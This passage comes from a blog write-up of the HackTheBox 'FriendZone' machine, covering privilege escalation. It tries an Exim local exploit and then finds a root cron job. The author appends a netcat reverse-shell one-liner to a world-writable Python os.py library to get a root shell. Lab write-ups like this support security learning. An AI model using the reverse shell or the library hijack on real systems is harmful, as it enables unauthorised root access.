+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>friend<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>friend<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>friend<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
+</pre></div>
+
+
+<p>From a <a href="https://wiki.ubuntu.com/Security/Privileges">Ubuntu wiki</a> I can read this about the <code>sambashare</code> group:</p>
+<div class="highlight"><pre><span></span>Share files with the local network
+
+This right is gained by adding the user to the &quot;sambashare&quot; group.
+
+The &quot;sambashare&quot; group can access the /var/lib/samba/usershares directory. 
+</pre></div>
+
+
+<p>so I moved to that directory and also created a file there hoping it would somehow get root permissions but nothing interesting:</p>
+<div class="highlight"><pre><span></span><span class="gp">friend@FriendZone:/var/lib/samba/usershares$</span> ls  -l
+<span class="go">total 4</span>
+<span class="go">-rw-rw-r-- 1 friend friend 42 Jun 11 07:26 rev.sh</span>
+</pre></div>
+
+
+<p>I keep looking at <code>LinEnum.sh</code> output and noticed there is potrt 25 listening on localhost:</p>
+<div class="highlight"><pre><span></span>tcp        <span class="m">0</span>      <span class="m">0</span> <span class="m">127</span>.0.0.1:25            <span class="m">0</span>.0.0.0:*               LISTEN      - 
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="gp">friend@FriendZone:/var/lib/samba/usershares$</span> telnet <span class="m">127</span>.0.0.1 <span class="m">25</span>
+<span class="go">Trying 127.0.0.1...</span>
+<span class="go">Connected to 127.0.0.1.</span>
+<span class="go">Escape character is &#39;^]&#39;.</span>
+<span class="go">220 FriendZone ESMTP Exim 4.90_1 Ubuntu Thu, 11 Jun 2020 07:38:48 +0300</span>
+<span class="go">user friend</span>
+<span class="go">500 unrecognized command</span>
+</pre></div>
+
+
+<p>I tried to connect using telnet but it does not recognize my commands. However, I still got the banner message which tells me we are dealing with <code>Exim 4.90_1</code>.</p>
+<p>I then noticed that Exim is also among the SUID file:</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>-<span class="o">]</span> SUID files:                                                                                
+&lt;SNIP&gt;
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">1140200</span> Feb <span class="m">14</span>  <span class="m">2018</span> /usr/sbin/exim4
+&lt;SNIP&gt;
+</pre></div>
+
+
+<p>Using <code>searchsploit</code> I noticed there is a privesc exploit script for Exim:</p>
+<div class="highlight"><pre><span></span><span class="go">Exim 4.87 - 4.91 - Local Privilege Escalation                                                                                                       | linux/local/46996.sh</span>
+</pre></div>
+
+
+<p>So I downloaded the script to the victim box using wget and then I ran it:</p>
+<div class="highlight"><pre><span></span><span class="gp">friend@FriendZone:/tmp$</span> ./46996.sh 
+
+<span class="go">raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span>
+<span class="go">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span>
+
+<span class="go">Preparing setuid shell helper...</span>
+<span class="go">Problems compiling setuid shell helper, check your gcc.</span>
+<span class="go">Falling back to the /bin/sh method.</span>
+
+<span class="go">Delivering setuid payload...</span>
+<span class="go">220 FriendZone ESMTP Exim 4.90_1 Ubuntu Thu, 11 Jun 2020 08:01:27 +0300</span>
+<span class="go">250 FriendZone Hello ip6-localhost [::1]</span>
+<span class="go">250 OK</span>
+<span class="go">250 Accepted</span>
+<span class="go">354 Enter message, ending with &quot;.&quot; on a line by itself</span>
+<span class="go">250 OK id=1jjFLD-0005UB-4C</span>
+<span class="go">221 FriendZone closing connection</span>
+
+<span class="go">Waiting 5 seconds...</span>
+<span class="go">-rwxr-xr-x 1 friend friend 121432 Jun 11 08:01 /tmp/pwned</span>
+<span class="gp">$</span> whoami
+<span class="go">friend</span>
+<span class="gp">$</span> /tmp/pwned
+<span class="gp">$</span> whoami
+<span class="go">friend</span>
+</pre></div>
+
+
+<p>The script creates a file <code>/tmp/pwned</code> which afer inspecting the bash code, looks like this is a a copy of the <code>sh</code> shell binary. The <code>pwned</code> file should be generated with root permissions (I believe) but this does not succeed apparently hence not getting a privileged shell. </p>
+<p>After a while being stuck with <code>exim</code> trying different things I decided to use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to monitor the box processes to see if there are any interesting processes popping up such as ron jobs. </p>
+<p>After few minutes of monitorig something indeed popped up:</p>
+<div class="highlight"><pre><span></span><span class="m">2020</span>/06/11 <span class="m">08</span>:50:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21680</span>  <span class="p">|</span> /usr/bin/python /opt/server_admin/reporter.py 
+<span class="m">2020</span>/06/11 <span class="m">08</span>:50:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21679</span>  <span class="p">|</span> /bin/sh -c /opt/server_admin/reporter.py 
+<span class="m">2020</span>/06/11 <span class="m">08</span>:50:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21678</span>  <span class="p">|</span> /usr/sbin/CRON -f 
+
+<span class="m">2020</span>/06/11 <span class="m">08</span>:52:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21684</span>  <span class="p">|</span> /usr/bin/python /opt/server_admin/reporter.py 
+<span class="m">2020</span>/06/11 <span class="m">08</span>:52:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21683</span>  <span class="p">|</span> /bin/sh -c /opt/server_admin/reporter.py 
+<span class="m">2020</span>/06/11 <span class="m">08</span>:52:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21682</span>  <span class="p">|</span> /usr/sbin/CRON -f 
+
+<span class="m">2020</span>/06/11 <span class="m">08</span>:54:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21688</span>  <span class="p">|</span> /bin/sh -c /opt/server_admin/reporter.py 
+<span class="m">2020</span>/06/11 <span class="m">08</span>:54:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21687</span>  <span class="p">|</span> /bin/sh -c /opt/server_admin/reporter.py 
+<span class="m">2020</span>/06/11 <span class="m">08</span>:54:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">21686</span>  <span class="p">|</span> /usr/sbin/CRON -f 
+</pre></div>
+
+
+<p>Although <code>LinEnum.sh</code> output did not show up any unusual cron job, <code>pspy</code> revealed there is a regular job running every 2 minutes. </p>
+<div class="highlight"><pre><span></span><span class="gp">friend@FriendZone:/opt/server_admin$</span> ll
+<span class="go">total 12</span>
+<span class="go">drwxr-xr-x 2 root root 4096 Jan 24  2019 ./</span>
+<span class="go">drwxr-xr-x 3 root root 4096 Oct  6  2018 ../</span>
+<span class="go">-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py*</span>
+</pre></div>
+
+
+<p><code>reporter.py</code> runs as root as shown above and contains the following code:</p>
+<div class="highlight"><pre><span></span><span class="n">friend</span><span class="nd">@FriendZone</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">server_admin</span><span class="err">$</span> <span class="n">cat</span> <span class="n">reporter</span><span class="o">.</span><span class="n">py</span> 
+<span class="c1">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">to_address</span> <span class="o">=</span> <span class="s2">&quot;admin1@friendzone.com&quot;</span>
+<span class="n">from_address</span> <span class="o">=</span> <span class="s2">&quot;admin2@friendzone.com&quot;</span>
+
+<span class="nb">print</span> <span class="s2">&quot;[+] Trying to send email to </span><span class="si">%s</span><span class="s2">&quot;</span><span class="o">%</span><span class="n">to_address</span>
+
+<span class="c1">#command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&#39;&#39;&#39;</span>
+
+<span class="c1">#os.system(command)</span>
+
+<span class="c1"># I need to edit the script later</span>
+<span class="c1"># Sam ~ python developer</span>
+</pre></div>
+
+
+<p>The script does not do anything special. However, it imports an external library, that is <code>os</code>. A peek at the library shows this:</p>
+<div class="highlight"><pre><span></span><span class="gp">friend@FriendZone:/opt/server_admin$</span> ll /usr/lib/python2.7/os.py
+<span class="go">-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py*</span>
+</pre></div>
+
+
+<p>The file has loose permissions (777) therefore we would be able to write on it. Surely this is a misconfiguration because if I look at the same file in my kali box I see permisions are set to 644:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> ll /usr/lib/python2.7/os.py
+<span class="go">-rw-r--r-- 1 root root 25910 Apr 20 21:30 /usr/lib/python2.7/os.py</span>
+</pre></div>
+
+
+<p>So now I can add a shell code in the <code>os.py</code> (I picked one from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>) and start a netcat listener on my kali box. When the cron job runs again I should get a shell:</p>
+<div class="highlight"><pre><span></span><span class="gp">friend@FriendZone:/tmp$</span> <span class="nb">echo</span> <span class="s1">&#39;system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.29 1234 &gt;/tmp/f&quot;)&#39;</span> &gt;&gt; /usr/lib/python2.7/os.py
+</pre></div>
+
+
+<p>Finally I get the shell and I am able to read the root flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">1234</span>
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 1234 ...</span>
+<span class="go">connect to [10.10.14.29] from (UNKNOWN) [10.10.10.123] 46358</span>
+<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="gp">#</span> whoami
+<span class="go">root</span>
+<span class="gp">#</span> cat /root/root.txt
+<span class="go">b0****************************c7</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Friendzone.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Friendzone"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
